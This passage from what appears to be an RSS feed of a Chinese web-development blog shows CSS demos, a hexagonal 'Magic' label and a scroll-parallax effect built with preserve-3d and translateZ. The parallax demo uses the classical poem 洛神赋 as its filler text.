            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3EMagic%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20filter%3A%20drop-shadow(2px%204px%203px%20hsla(60%2C%20100%25%2C%2010%25%2C%200.5))%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20width%3A%20200px%3B%5Cn%20%20height%3A%2060px%3B%5Cn%20%20font-size%3A%2020px%3B%5Cn%20%20color%3A%20%23be9451%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%20%20background%3A%20linear-gradient(%23f5e5bf%2C%20%23fbe8c8%2C%20%23f5e5bf)%3B%5Cn%20%20clip-path%3A%20polygon(10%25%200%25%2C%2090%25%200%25%2C%20100%25%2050%25%2C%2090%25%20100%25%2C%2010%25%20100%25%2C%200%2050%25)%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>Magic<span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>filter</span><span>:</span> <span>drop-shadow</span><span>(</span>2px 4px 3px <span>hsla</span><span>(</span>60<span>,</span> 100%<span>,</span> 10%<span>,</span> 0.5<span>)</span><span>)</span><span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 60px<span>;</span>
  <span>font-size</span><span>:</span> 20px<span>;</span>
  <span>color</span><span>:</span> #be9451<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>#f5e5bf<span>,</span> #fbe8c8<span>,</span> #f5e5bf<span>)</span><span>;</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>10% 0%<span>,</span> 90% 0%<span>,</span> 100% 50%<span>,</span> 90% 100%<span>,</span> 10% 100%<span>,</span> 0 50%<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>滚动视差</title>
      <link>https://www.matrixtheone.ga/web/magic/Scroll-Parallax/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Scroll-Parallax/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">滚动视差</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h3 id="transform-style-preserve-3d"> transform-style: preserve-3d</h3>
<blockquote>
<p>3D 空间图片视距较远离正常平面</p>
</blockquote>

          <div
            id="code-demo-2db29869"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cheader%3E%3C%2Fheader%3E%5Cn%20%20%3Carticle%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E9%BB%84%E5%88%9D%E4%B8%89%E5%B9%B4%EF%BC%8C%E4%BD%99%E6%9C%9D%E4%BA%AC%E5%B8%88%EF%BC%8C%E8%BF%98%E6%B5%8E%E6%B4%9B%E5%B7%9D%E3%80%82%E5%8F%A4%E4%BA%BA%E6%9C%89%E8%A8%80%EF%BC%9A%E6%96%AF%E6%B0%B4%E4%B9%8B%E7%A5%9E%EF%BC%8C%E5%90%8D%E6%9B%B0%E5%AE%93%E5%A6%83%E3%80%82%E6%84%9F%E5%AE%8B%E7%8E%89%E5%AF%B9%E6%A5%9A%E7%8E%8B%E7%A5%9E%E5%A5%B3%E4%B9%8B%E4%BA%8B%EF%BC%8C%E9%81%82%E4%BD%9C%E6%96%AF%E8%B5%8B%E3%80%82%E5%85%B6%E8%AF%8D%E6%9B%B0%EF%BC%9A%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E4%BB%8E%E4%BA%AC%E5%9F%9F%EF%BC%8C%E8%A8%80%E5%BD%92%E4%B8%9C%E8%97%A9%EF%BC%8C%E8%83%8C%E4%BC%8A%E9%98%99%EF%BC%8C%E8%B6%8A%E8%BD%98%E8%BE%95%EF%BC%8C%E7%BB%8F%E9%80%9A%E8%B0%B7%EF%BC%8C%E9%99%B5%E6%99%AF%E5%B1%B1%E3%80%82%E6%97%A5%E6%97%A2%E8%A5%BF%E5%80%BE%EF%BC%8C%E8%BD%A6%E6%AE%86%E9%A9%AC%E7%83%A6%E3%80%82%E5%B0%94%E4%B9%83%E7%A8%8E%E9%A9%BE%E4%B9%8E%E8%98%85%E7%9A%8B%EF%BC%8C%E7%A7%A3%E9%A9%B7%E4%B9%8E%E8%8A%9D%E7%94%B0%EF%BC%8C%E5%AE%B9%E4%B8%8E%E4%B9%8E%E9%98%B3%E6%9E%97%EF%BC%8C%E6%B5%81%E7%9C%84%E4%B9%8E%E6%B4%9B%E5%B7%9D%E3%80%82%E4%BA%8E%E6%98%AF%E7%B2%BE%E7%A7%BB%E7%A5%9E%E9%AA%87%EF%BC%8C%E5%BF%BD%E7%84%89%E6%80%9D%E6%95%A3%E3%80%82%E4%BF%AF%E5%88%99%E6%9C%AA%E5%AF%9F%EF%BC%8C%E4%BB%B0%E4%BB%A5%E6%AE%8A%E8%A7%82%E3%80%82%E7%9D%B9%E4%B8%80%E4%B8%BD%E4%BA%BA%EF%BC%8C%E4%BA%8E%E5%B2%A9%E4%B9%8B%E7%95%94%E3%80%82%E4%B9%83%E6%8F%B4%E5%BE%A1%E8%80%85%E8%80%8C%E5%91%8A%E4%B9%8B%E6%9B%B0%EF%BC%9A%E2%80%9C%E5%B0%94%E6%9C%89%E8%A7%8C%E4%BA%8E%E5%BD%BC%E8%80%85%E4%B9%8E%EF%BC%9F%E5%BD%BC%E4%BD%95%E4%BA%BA%E6%96%AF%EF%BC%8C%E8%8B%A5%E6%AD%A4%E4%B9%8B%E8%89%B3%E4%B9%9F%EF%BC%81%E2%80%9D%E5%BE%A1%E8%80%85%E5%AF%B9%E6%9B%B0%EF%BC%9A%E2%80%9C%E8%87%A3%E9%97%BB%E6%B2%B3%E6%B4%9B%E4%B9%8B%E7%A5%9E%EF%BC%8C%E5%90%8D%E6%9B%B0%E5%AE%93%E5%A6%83%E3%80%82%E7%84%B6%E5%88%99%E5%90%9B%E7%8E%8B%E4%B9%8B%E6%89%80%E8%A7%81%E4%B9%9F%EF%BC%8C%E6%97%A0%E4%B9%83%E6%98%AF%E4%B9%8E%EF%BC%81%E5%85%B6%E7%8A%B6%E8%8B%A5%E4%BD%95%EF%BC%9F%E8%87%A3%E6%84%BF%E9%97%BB%E4%B9%8B%E3%80%82%E2%80%9D%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E5%91%8A%E4%B9%8B%E6%9B%B0%EF%BC%9A%E5%85%B6%E5%BD%A2%E4%B9%9F%EF%BC%8C%E7%BF%A9%E8%8B%A5%E6%83%8A%E9%B8%BF%EF%BC%8C%E5%A9%89%E8%8B%A5%E6%B8%B8%E9%BE%99%E3%80%82%E8%8D%A3%E6%9B%9C%E7%A7%8B%E8%8F%8A%EF%BC%8C%E5%8D%8E%E8%8C%82%E6%98%A5%E6%9D%BE%E3%80%82%E9%AB%A3%E9%AB%B4%E5%85%AE%E8%8B%A5%E8%BD%BB%E4%BA%91%E4%B9%8B%E8%94%BD%E6%9C%88%EF%BC%8C%E9%A3%98%E9%A3%96%E5%85%AE%E8%8B%A5%E6%B5%81%E9%A3%8E%E4%B9%8B%E5%9B%9E%E9%9B%AA%E3%80%82%E8%BF%9C%E8%80%8C%E6%9C%9B%E4%B9%8B%EF%BC%8C%E7%9A%8E%E8%8B%A5%E5%A4%AA%E9%98%B3%E5%8D%87%E6%9C%9D%E9%9C%9E%EF%BC%9B%E8%BF%AB%E8%80%8C%E5%AF%9F%E4%B9%8B%EF%BC%8C%E7%81%BC%E8%8B%A5%E8%8A%99%E8%95%96%E5%87%BA%E6%B8%8C%E6%B3%A2%E3%80%82%E7%A7%BE%E7%BA%A4%E5%BE%97%E8%A1%B7%EF%BC%8C%E4%BF%AE%E7%9F%AD%E5%90%88%E5%BA%A6%E3%80%82%E8%82%A9%E8%8B%A5%E5%89%8A%E6%88%90%EF%BC%8C%E8%85%B0%E5%A6%82%E7%BA%A6%E7%B4%A0%E3%80%82%E5%BB%B6%E9%A2%88%E7%A7%80%E9%A1%B9%EF%BC%8C%E7%9A%93%E8%B4%A8%E5%91%88%E9%9C%B2%E3%80%82%E8%8A%B3%E6%B3%BD%E6%97%A0%E5%8A%A0%EF%BC%8C%E9%93%85%E5%8D%8E%E5%BC%97%E5%BE%A1%E3%80%82%E4%BA%91%E9%AB%BB%E5%B3%A8%E5%B3%A8%EF%BC%8C%E4%BF%AE%E7%9C%89%E8%81%94%E5%A8%9F%E3%80%82%E4%B8%B9%E5%94%87%E5%A4%96%E6%9C%97%EF%BC%8C%E7%9A%93%E9%BD%BF%E5%86%85%E9%B2%9C%E3%80%82%E6%98%8E%E7%9C%B8%E5%96%84%E7%9D%90%EF%BC%8C%E9%9D%A5%E8%BE%85%E6%89%BF%E6%9D%83%E3%80%82%E7%93%8C%E5%A7%BF%E8%89%B3%E9%80%B8%EF%BC%8C%E4%BB%AA%E9%9D%99%E4%BD%93%E9%97%B2%E3%80%82%E6%9F%94%E6%83%85%E7%BB%B0%E6%80%81%EF%BC%8C%E5%AA%9A%E4%BA%8E%E8%AF%AD%E8%A8%80%E3%80%82%E5%A5%87%E6%9C%8D%E6%97%B7%E4%B8%96%EF%BC%8C%E9%AA%A8%E5%83%8F%E5%BA%94%E5%9B%BE%E3%80%82%E6%8A%AB%E7%BD%97%E8%A1%A3%E4%B9%8B%E7%92%80%E7%B2%B2%E5%85%AE%EF%BC%8C%E7%8F%A5%E7%91%B6%E7%A2%A7%E4%B9%8B%E5%8D%8E%E7%90%9A%E3%80%82%E6%88%B4%E9%87%91%E7%BF%A0%E4%B9%8B%E9%A6%96%E9%A5%B0%EF%BC%8C%E7%BC%80%E6%98%8E%E7%8F%A0%E4%BB%A5%E8%80%80%E8%BA%AF%E3%80%82%E8%B7%B5%E8%BF%9C%E6%B8%B8%E4%B9%8B%E6%96%87%E5%B1%A5%EF%BC%8C%E6%9B%B3%E9%9B%BE%E7%BB%A1%E4%B9%8B%E8%BD%BB%E8%A3%BE%E3%80%82%E5%BE%AE%E5%B9%BD%E5%85%B0%E4%B9%8B%E8%8A%B3%E8%94%BC%E5%85%AE%EF%BC%8C%E6%AD%A5%E8%B8%9F%E8%B9%B0%E4%BA%8E%E5%B1%B1%E9%9A%85%E3%80%82%E4%BA%8E%E6%98%AF%E5%BF%BD%E7%84%89%E7%BA%B5%E4%BD%93%EF%BC%8C%E4%BB%A5%E9%81%A8%E4%BB%A5%E5%AC%89%E3%80%82%E5%B7%A6%E5%80%9A%E9%87%87%E6%97%84%EF%BC%8C%E5%8F%B3%E8%8D%AB%E6%A1%82%E6%97%97%E3%80%82%E6%94%98%E7%9A%93%E8%85%95%E4%BA%8E%E7%A5%9E%E6%B5%92%E5%85%AE%EF%BC%8C%E9%87%87%E6%B9%8D%E6%BF%91%E4%B9%8B%E7%8E%84%E8%8A%9D%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E6%83%85%E6%82%A6%E5%85%B6%E6%B7%91%E7%BE%8E%E5%85%AE%EF%BC%8C%E5%BF%83%E6%8C%AF%E8%8D%A1%E8%80%8C%E4%B8%8D%E6%80%A1%E3%80%82%E6%97%A0%E8%89%AF%E5%AA%92%E4%BB%A5%E6%8E%A5%E6%AC%A2%E5%85%AE%EF%BC%8C%E6%89%98%E5%BE%AE%E6%B3%A2%E8%80%8C%E9%80%9A%E8%BE%9E%E3%80%82%E6%84%BF%E8%AF%9A%E7%B4%A0%E4%B9%8B%E5%85%88%E8%BE%BE%E5%85%AE%EF%BC%8C%E8%A7%A3%E7%8E%89%E4%BD%A9%E4%BB%A5%E8%A6%81%E4%B9%8B%E3%80%82%E5%97%9F%E4%BD%B3%E4%BA%BA%E4%B9%8B%E4%BF%A1%E4%BF%AE%E5%85%AE%EF%BC%8C%E7%BE%8C%E4%B9%A0%E7%A4%BC%E8%80%8C%E6%98%8E%E8%AF%97%E3%80%82%E6%8A%97%E7%90%BC%E7%8F%B6%E4%BB%A5%E5%92%8C%E4%BA%88%E5%85%AE%EF%BC%8C%E6%8C%87%E6%BD%9C%E6%B8%8A%E8%80%8C%E4%B8%BA%E6%9C%9F%E3%80%82%E6%89%A7%E7%9C%B7%E7%9C%B7%E4%B9%8B%E6%AC%BE%E5%AE%9E%E5%85%AE%EF%BC%8C%E6%83%A7%E6%96%AF%E7%81%B5%E4%B9%8B%E6%88%91%E6%AC%BA%E3%80%82%E6%84%9F%E4%BA%A4%E7%94%AB%E4%B9%8B%E5%BC%83%E8%A8%80%E5%85%AE%EF%BC%8C%E6%80%85%E7%8A%B9%E8%B1%AB%E8%80%8C%E7%8B%90%E7%96%91%E3%80%82%E6%94%B6%E5%92%8C%E9%A2%9C%E8%80%8C%E9%9D%99%E5%BF%97%E5%85%AE%EF%BC%8C%E7%94%B3%E7%A4%BC%E9%98%B2%E4%BB%A5%E8%87%AA%E6%8C%81%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E6%B4%9B%E7%81%B5%E6%84%9F%E7%84%89%EF%BC%8C%E5%BE%99%E5%80%9A%E5%BD%B7%E5%BE%A8%E3%80%82%E7%A5%9E%E5%85%89%E7%A6%BB%E5%90%88%EF%BC%8C%E4%B9%8D%E9%98%B4%E4%B9%8D%E9%98%B3%E3%80%82%E7%AB%A6%E8%BD%BB%E8%BA%AF%E4%BB%A5%E9%B9%A4%E7%AB%8B%EF%BC%8C%E8%8B%A5%E5%B0%86%E9%A3%9E%E8%80%8C%E6%9C%AA%E7%BF%94%E3%80%82%E8%B7%B5%E6%A4%92%E6%B6%82%E4%B9%8B%E9%83%81%E7%83%88%EF%BC%8C%E6%AD%A5%E8%98%85%E8%96%84%E8%80%8C%E6%B5%81%E8%8A%B3%E3%80%82%E8%B6%85%E9%95%BF%E5%90%9F%E4%BB%A5%E6%B0%B8%E6%85%95%E5%85%AE%EF%BC%8C%E5%A3%B0%E5%93%80%E5%8E%89%E8%80%8C%E5%BC%A5%E9%95%BF%E3%80%82%E5%B0%94%E4%B9%83%E4%BC%97%E7%81%B5%E6%9D%82%E6%B2%93%EF%BC%8C%E5%91%BD%E4%BF%A6%E5%95%B8%E4%BE%A3%E3%80%82%E6%88%96%E6%88%8F%E6%B8%85%E6%B5%81%EF%BC%8C%E6%88%96%E7%BF%94%E7%A5%9E%E6%B8%9A%EF%BC%8C%E6%88%96%E9%87%87%E6%98%8E%E7%8F%A0%EF%BC%8C%E6%88%96%E6%8B%BE%E7%BF%A0%E7%BE%BD%E3%80%82%E4%BB%8E%E5%8D%97%E6%B9%98%E4%B9%8B%E4%BA%8C%E5%A6%83%EF%BC%8C%E6%90%BA%E6%B1%89%E6%BB%A8%E4%B9%8B%E6%B8%B8%E5%A5%B3%E3%80%82%E5%8F%B9%E5%8C%8F%E7%93%9C%E4%B9%8B%E6%97%A0%E5%8C%B9%E5%85%AE%EF%BC%8C%E5%92%8F%E7%89%B5%E7%89%9B%E4%B9%8B%E7%8B%AC%E5%A4%84%E3%80%82%E6%89%AC%E8%BD%BB%E8%A2%BF%E4%B9%8B%E7%8C%97%E9%9D%A1%E5%85%AE%EF%BC%8C%E7%BF%B3%E4%BF%AE%E8%A2%96%E4%BB%A5%E5%BB%B6%E4%BC%AB%E3%80%82%E4%BD%93%E8%BF%85%E9%A3%9E%E5%87%AB%EF%BC%8C%E9%A3%98%E5%BF%BD%E8%8B%A5%E7%A5%9E%E3%80%82%E5%87%8C%E6%B3%A2%E5%BE%AE%E6%AD%A5%EF%BC%8C%E7%BD%97%E8%A2%9C%E7%94%9F%E5%B0%98%E3%80%82%E5%8A%A8%E6%97%A0%E5%B8%B8%E5%88%99%EF%BC%8C%E8%8B%A5%E5%8D%B1%E8%8B%A5%E5%AE%89%EF%BC%9B%E8%BF%9B%E6%AD%A2%E9%9A%BE%E6%9C%9F%EF%BC%8C%E8%8B%A5%E5%BE%80%E8%8B%A5%E8%BF%98%E3%80%82%E8%BD%AC%E7%9C%84%E6%B5%81%E7%B2%BE%EF%BC%8C%E5%85%89%E6%B6%A6%E7%8E%89%E9%A2%9C%E3%80%82%E5%90%AB%E8%BE%9E%E6%9C%AA%E5%90%90%EF%BC%8C%E6%B0%94%E8%8B%A5%E5%B9%BD%E5%85%B0%E3%80%82%E5%8D%8E%E5%AE%B9%E5%A9%80%E5%A8%9C%EF%BC%8C%E4%BB%A4%E6%88%91%E5%BF%98%E9%A4%90%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E5%B1%8F%E7%BF%B3%E6%94%B6%E9%A3%8E%EF%BC%8C%E5%B7%9D%E5%90%8E%E9%9D%99%E6%B3%A2%E3%80%82%E5%86%AF%E5%A4%B7%E9%B8%A3%E9%BC%93%EF%BC%8C%E5%A5%B3%E5%A8%B2%E6%B8%85%E6%AD%8C%E3%80%82%E8%85%BE%E6%96%87%E9%B1%BC%E4%BB%A5%E8%AD%A6%E4%B9%98%EF%BC%8C%E9%B8%A3%E7%8E%89%E9%8A%AE%E4%BB%A5%E5%81%95%E9%80%9D%E3%80%82%E5%85%AD%E9%BE%99%E4%BF%A8%E5%85%B6%E9%BD%90%E9%A6%96%EF%BC%8C%E8%BD%BD%E4%BA%91%E8%BD%A6%E4%B9%8B%E5%AE%B9%E8%A3%94%E3%80%82%E9%B2%B8%E9%B2%B5%E8%B8%8A%E8%80%8C%E5%A4%B9%E6%AF%82%EF%BC%8C%E6%B0%B4%E7%A6%BD%E7%BF%94%E8%80%8C%E4%B8%BA%E5%8D%AB%E3%80%82%E4%BA%8E%E6%98%AF%E8%B6%8A%E5%8C%97%E6%B2%9A%EF%BC%8C%E8%BF%87%E5%8D%97%E5%86%88%EF%BC%8C%E7%BA%A1%E7%B4%A0%E9%A2%86%EF%BC%8C%E5%9B%9E%E6%B8%85%E6%89%AC%E3%80%82%E5%8A%A8%E6%9C%B1%E5%94%87%E4%BB%A5%E5%BE%90%E8%A8%80%EF%BC%8C%E9%99%88%E4%BA%A4%E6%8E%A5%E4%B9%8B%E5%A4%A7%E7%BA%B2%E3%80%82%E6%81%A8%E4%BA%BA%E7%A5%9E%E4%B9%8B%E9%81%93%E6%AE%8A%E5%85%AE%EF%BC%8C%E6%80%A8%E7%9B%9B%E5%B9%B4%E4%B9%8B%E8%8E%AB%E5%BD%93%E3%80%82%E6%8A%97%E7%BD%97%E8%A2%82%E4%BB%A5%E6%8E%A9%E6%B6%95%E5%85%AE%EF%BC%8C%E6%B3%AA%E6%B5%81%E8%A5%9F%E4%B9%8B%E6%B5%AA%E6%B5%AA%E3%80%82%E6%82%BC%E8%89%AF%E4%BC%9A%E4%B9%8B%E6%B0%B8%E7%BB%9D%E5%85%AE%EF%BC%8C%E5%93%80%E4%B8%80%E9%80%9D%E8%80%8C%E5%BC%82%E4%B9%A1%E3%80%82%E6%97%A0%E5%BE%AE%E6%83%85%E4%BB%A5%E6%95%88%E7%88%B1%E5%85%AE%EF%BC%8C%E7%8C%AE%E6%B1%9F%E5%8D%97%E4%B9%8B%E6%98%8E%E7%8F%B0%E3%80%82%E8%99%BD%E6%BD%9C%E5%A4%84%E4%BA%8E%E5%A4%AA%E9%98%B4%EF%BC%8C%E9%95%BF%E5%AF%84%E5%BF%83%E4%BA%8E%E5%90%9B%E7%8E%8B%E3%80%82%E5%BF%BD%E4%B8%8D%E6%82%9F%E5%85%B6%E6%89%80%E8%88%8D%EF%BC%8C%E6%80%85%E7%A5%9E%E5%AE%B5%E8%80%8C%E8%94%BD%E5%85%89%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E8%83%8C%E4%B8%8B%E9%99%B5%E9%AB%98%EF%BC%8C%E8%B6%B3%E5%BE%80%E7%A5%9E%E7%95%99%E3%80%82%E9%81%97%E6%83%85%E6%83%B3%E5%83%8F%EF%BC%8C%E9%A1%BE%E6%9C%9B%E6%80%80%E6%84%81%E3%80%82%E5%86%80%E7%81%B5%E4%BD%93%E4%B9%8B%E5%A4%8D%E5%BD%A2%EF%BC%8C%E5%BE%A1%E8%BD%BB%E8%88%9F%E8%80%8C%E4%B8%8A%E6%BA%AF%E3%80%82%E6%B5%AE%E9%95%BF%E5%B7%9D%E8%80%8C%E5%BF%98%E5%8F%8D%EF%BC%8C%E6%80%9D%E7%BB%B5%E7%BB%B5%E8%80%8C%E5%A2%9E%E6%85%95%E3%80%82%E5%A4%9C%E8%80%BF%E8%80%BF%E8%80%8C%E4%B8%8D%E5%AF%90%EF%BC%8C%E6%B2%BE%E7%B9%81%E9%9C%9C%E8%80%8C%E8%87%B3%E6%9B%99%E3%80%82%E5%91%BD%E4%BB%86%E5%A4%AB%E8%80%8C%E5%B0%B1%E9%A9%BE%EF%BC%8C%E5%90%BE%E5%B0%86%E5%BD%92%E4%B9%8E%E4%B8%9C%E8%B7%AF%E3%80%82%E6%8F%BD%E9%A8%91%E8%BE%94%E4%BB%A5%E6%8A%97%E7%AD%96%EF%BC%8C%E6%80%85%E7%9B%98%E6%A1%93%E8%80%8C%E4%B8%8D%E8%83%BD%E5%8E%BB%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%3C%2Farticle%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22html%20%7B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%7D%5Cn%5Cnmain%20%7B%5Cn%20%20overflow-x%3A%20hidden%3B%5Cn%20%20overflow-y%3A%20auto%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20perspective%3A%201px%3B%5Cn%20%20transform-style%3A%20preserve-3d%3B%5Cn%7D%5Cn%5Cnheader%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20transform-style%3A%20inherit%3B%5Cn%20%20transform%3A%20translateZ(-0.9px)%20scale(2)%3B%20%2F*%20Z%E8%BD%B4%E8%BF%9C%E7%A6%BB%E5%B9%B3%E9%9D%A2%E5%90%8E%E6%98%BE%E5%B0%8F%EF%BC%8C%E6%94%BE%E5%A4%A7%E5%9B%9E%E5%BD%92%E6%AD%A3%E5%B8%B8%E5%B9%B3%E9%9D%A2%E8%A7%82%E6%84%9F%20*%2F%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-2.webp)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cnarticle%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20text-indent%3A%202em%3B%5Cn%20%20font-size%3A%2018px%3B%5Cn%20%20letter-spacing%3A%208px%3B%5Cn%20%20padding%3A%201em%200%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20background%3A%20%23fff%3B%5Cn%7D%5Cn%5Cn%3A%3A-webkit-scrollbar%20%7B%5Cn%20%20width%3A%208px%3B%5Cn%20%20height%3A%208px%3B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%7D%5Cn%5Cn%3A%3A-webkit-scrollbar-thumb%20%7B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%20%20background%3A%20%2340bf95ff%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>header</span><span>></span></span><span><span><span>&lt;/</span>header</span><span>></span></span>
  <span><span><span>&lt;</span>article</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      黄初三年，余朝京师，还济洛川。古人有言：斯水之神，名曰宓妃。感宋玉对楚王神女之事，遂作斯赋。其词曰：
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余从京域，言归东藩，背伊阙，越轘辕，经通谷，陵景山。日既西倾，车殆马烦。尔乃税驾乎蘅皋，秣驷乎芝田，容与乎阳林，流眄乎洛川。于是精移神骇，忽焉思散。俯则未察，仰以殊观。睹一丽人，于岩之畔。乃援御者而告之曰：“尔有觌于彼者乎？彼何人斯，若此之艳也！”御者对曰：“臣闻河洛之神，名曰宓妃。然则君王之所见也，无乃是乎！其状若何？臣愿闻之。”
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余告之曰：其形也，翩若惊鸿，婉若游龙。荣曜秋菊，华茂春松。髣髴兮若轻云之蔽月，飘飖兮若流风之回雪。远而望之，皎若太阳升朝霞；迫而察之，灼若芙蕖出渌波。秾纤得衷，修短合度。肩若削成，腰如约素。延颈秀项，皓质呈露。芳泽无加，铅华弗御。云髻峨峨，修眉联娟。丹唇外朗，皓齿内鲜。明眸善睐，靥辅承权。瓌姿艳逸，仪静体闲。柔情绰态，媚于语言。奇服旷世，骨像应图。披罗衣之璀粲兮，珥瑶碧之华琚。戴金翠之首饰，缀明珠以耀躯。践远游之文履，曳雾绡之轻裾。微幽兰之芳蔼兮，步踟蹰于山隅。于是忽焉纵体，以遨以嬉。左倚采旄，右荫桂旗。攘皓腕于神浒兮，采湍濑之玄芝。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余情悦其淑美兮，心振荡而不怡。无良媒以接欢兮，托微波而通辞。愿诚素之先达兮，解玉佩以要之。嗟佳人之信修兮，羌习礼而明诗。抗琼珶以和予兮，指潜渊而为期。执眷眷之款实兮，惧斯灵之我欺。感交甫之弃言兮，怅犹豫而狐疑。收和颜而静志兮，申礼防以自持。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是洛灵感焉，徙倚彷徨。神光离合，乍阴乍阳。竦轻躯以鹤立，若将飞而未翔。践椒涂之郁烈，步蘅薄而流芳。超长吟以永慕兮，声哀厉而弥长。尔乃众灵杂沓，命俦啸侣。或戏清流，或翔神渚，或采明珠，或拾翠羽。从南湘之二妃，携汉滨之游女。叹匏瓜之无匹兮，咏牵牛之独处。扬轻袿之猗靡兮，翳修袖以延伫。体迅飞凫，飘忽若神。凌波微步，罗袜生尘。动无常则，若危若安；进止难期，若往若还。转眄流精，光润玉颜。含辞未吐，气若幽兰。华容婀娜，令我忘餐。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是屏翳收风，川后静波。冯夷鸣鼓，女娲清歌。腾文鱼以警乘，鸣玉銮以偕逝。六龙俨其齐首，载云车之容裔。鲸鲵踊而夹毂，水禽翔而为卫。于是越北沚，过南冈，纡素领，回清扬。动朱唇以徐言，陈交接之大纲。恨人神之道殊兮，怨盛年之莫当。抗罗袂以掩涕兮，泪流襟之浪浪。悼良会之永绝兮，哀一逝而异乡。无微情以效爱兮，献江南之明珰。虽潜处于太阴，长寄心于君王。忽不悟其所舍，怅神宵而蔽光。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是背下陵高，足往神留。遗情想像，顾望怀愁。冀灵体之复形，御轻舟而上溯。浮长川而忘反，思绵绵而增慕。夜耿耿而不寐，沾繁霜而至曙。命仆夫而就驾，吾将归乎东路。揽騑辔以抗策，怅盘桓而不能去。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;/</span>article</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><div><pre><code><span>html</span> <span>{</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>

<span>main</span> <span>{</span>
  <span>overflow-x</span><span>:</span> hidden<span>;</span>
  <span>overflow-y</span><span>:</span> auto<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
